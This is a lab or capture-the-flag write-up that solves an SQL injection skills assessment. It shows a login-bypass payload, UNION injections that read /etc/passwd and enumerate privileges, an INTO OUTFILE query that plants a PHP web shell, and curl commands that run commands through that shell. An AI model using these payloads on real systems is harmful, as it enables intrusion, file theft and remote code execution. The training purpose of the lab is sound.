# Skills Assessment - SQL Injection Fundamentals

<img width="1041" height="678" alt="image" src="https://github.com/user-attachments/assets/6f5b4b77-055b-4482-8df9-3c074dcea878" />


## Objective

Assess the web application and use a variety of techniques to gain remote code execution 
and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

## Start Here

From the login screen login using the below injecting: 

`admin' OR '1' = '1' -- -`

This will bring you to the dashboard: 

<img width="1912" height="696" alt="image" src="https://github.com/user-attachments/assets/893a4fd0-c399-4720-981a-6ba3b99ac103" />

Test whether the "SEARCH" field is vulnerable to SQL injections using `'`:

<img width="1683" height="314" alt="image" src="https://github.com/user-attachments/assets/5c3348d9-5c24-4ae1-bf0d-fe8465c8c0a3" />

Utilize UNION injections to attempt reading files from the backend server:

`' UNION SELECT 1,2,3,4,5 -- -`

<img width="1573" height="391" alt="image" src="https://github.com/user-attachments/assets/daaaeb05-2a80-4331-b294-2d634ad91b12" />

Determine the SQL user that is running the queries in the backend server:

`' UNION SELECT 1,user(),3,4,5 -- -`

<img width="1560" height="375" alt="image" src="https://github.com/user-attachments/assets/11bb79cb-d3fe-421a-baa6-fb8197cd1dc9" />

Enumerate all the privileges that the root user has:

`' UNION SELECT 1, grantee, privilege_type, is_grantable, 5 FROM information_schema.user_privileges -- -`

<img width="1507" height="411" alt="image" src="https://github.com/user-attachments/assets/7bf49d2d-9083-4ea7-9e5a-e21bb246d269" />


Attempt to read the /etc/passwd file from the backend server using the LOAD_FILE function:

`' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4, 5-- -`

<img width="1519" height="531" alt="image" src="https://github.com/user-attachments/assets/491cd9d9-ef3d-4869-b09d-9bf0ae49873c" />

Make sure that the MySQL global variable secure_file_priv is not enabled:

`' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables WHERE variable_name="secure_file_priv" -- -`

<img width="1547" height="374" alt="image" src="https://github.com/user-attachments/assets/53cdf450-c11e-4c6b-a55b-62b83ba0bde6" />


Root can read and write files to any directory in the entire file system. Write a PHP web shell shell.php:

`' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "", "" INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -`

<img width="1725" height="343" alt="image" src="https://github.com/user-attachments/assets/1ab17b55-8823-4de8-9b64-2e4ad4e3c8ed" />

CURL to invoke the web shell, passing commands to the URL parameter cmd: 

`curl -w "\n" -s http://94.237.49.23:55873/dashboard/shell.php?cmd=ls+/ | sed -e '1,2d'`

```
$ curl -w "\n" -s http://94.237.49.23:55873/dashboard/shell.php?cmd=ls+/ | sed -e '1,2d'
	bin
boot
dev
etc
flag_cae1dadcd174.txt   <----------------- here 
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

Print its contents out with cat cmd: 

```
curl -w "\n" -s http://94.237.49.23:55873/dashboard/shell.php?cmd=cat+/flag_cae1dadcd174.txt | sed -e '1,2d'
	528d6dxxxxxxxxxxxxx46ef226e918396
```
---









